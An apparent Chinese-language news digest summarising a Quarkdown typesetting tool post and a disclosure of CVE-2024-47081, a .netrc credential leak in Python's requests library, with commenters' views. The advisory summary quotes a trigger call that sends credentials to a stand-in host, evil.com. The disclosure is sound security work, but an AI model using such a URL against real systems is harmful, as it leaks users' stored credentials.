Quarkdown: A modern Markdown-based typesetting system

作者: asicsp | 评分: 215 | 评论数: 35 | 发布时间: 2025-06-03 08:06
文章摘要

Quarkdown 是一个现代的、基于 Markdown 的排版系统，具有强大的扩展功能，能够将项目编译为可打印的书籍或互动演示文稿。它扩展了 CommonMark 和 GFM，支持函数调用、变量定义和条件逻辑等高级功能，使得 Markdown 可以实现复杂的动态内容。Quarkdown 还支持 HTML、PDF、幻灯片等多种输出格式，并具备快速编译和实时预览功能。它兼具简单易读和强大的文档控制能力，适合需要从简单到复杂文档处理的用户。使用前需安装 Java 17 或以上版本，并可通过 Gradle 构建项目。

CVE-2024-47081: Netrc credential leak in PSF requests library

作者: jupenur | 评分: 49 | 评论数: 9 | 发布时间: 2025-06-03 18:39
文章摘要

文章报告了PSF requests库中的一个安全漏洞（CVE-2024-47081），该漏洞由于错误的URL处理，可能在特定条件下将.netrc凭据泄露给第三方。触发漏洞的API调用示例为`requests.get('http://example.com:@evil.com/')`，如果.netrc中配置了example.com的凭据，它们会被泄露给evil.com。该问题根源在于库中的特定代码段，已于2024年9月12日报告给维护者，但尚未修复。作为临时解决方案，用户可以在每次API调用时明确指定凭据以禁用.netrc访问。

评论摘要
主要讨论点：Python的`requests`库中的一个漏洞及其影响，特别是与`.netrc`文件和URL解析相关的问题。 不同观点： • **janzer**：认为该漏洞相对小众，但由于`requests`库是一个由Python基金会维护的流行库，因此令人担忧的是，自2024年9月12日报告以来仍未有修复方案。 • **woodruffw**：质疑该漏洞的实际影响，提出问题：有多少用户实际使用`.netrc`文件？个人使用网络工具多年，从未使用过`.netrc`文件，因此怀疑该漏洞的广泛影响。 • **Daviey**：提供了一个实际的例子，展示了一个易受攻击的网络服务，即使代码中没有引用`.netrc`文件，但该文件的存在仍会导致凭证泄露。强调了即使未直接引用，`.netrc`文件仍可能存在于服务器上并引发问题。 • **zx8080**：提到与漏洞根本原因相关的有趣的提交信息，但没有深入讨论技术细节。 • **awoimbee**：批评`urllib`库的URL解析功能不佳，特别是`url.hostname`和`url.netloc`的返回值问题，认为这增加了开发者的困扰。 • **audiodude**：指出自己从未听说过`.netrc`文件，并提供了一个链接供不熟悉该文件的用户参考。 • **pixl97**：提供了一个具体的代码示例，展示了如何通过恶意URL调用泄露`.netrc`中的凭证，说明了漏洞的实际利用方式。 补充讨论： • **争议焦点**：漏洞的实际影响范围。woodruffw怀疑其实际广泛性，而Daviey通过实际例子表明即使未直接引用，`.netrc`文件仍可能引发问题。 • **技术细节**：多个评论讨论了URL解析的问题，特别是awoimbee和pixl97提供的具体技术细节和代码示例，帮助更好地理解漏洞的运作机制。 • **修复状态**：多个评论提到该漏洞自2024年9月12日报告以来仍未有修复方案，显示出对修复进展的关注。 总体而言，讨论围绕漏洞的技术细节、实际影响和修复进展展开，不同的评论者提供了各自的观点和例子来支持他们的立场。
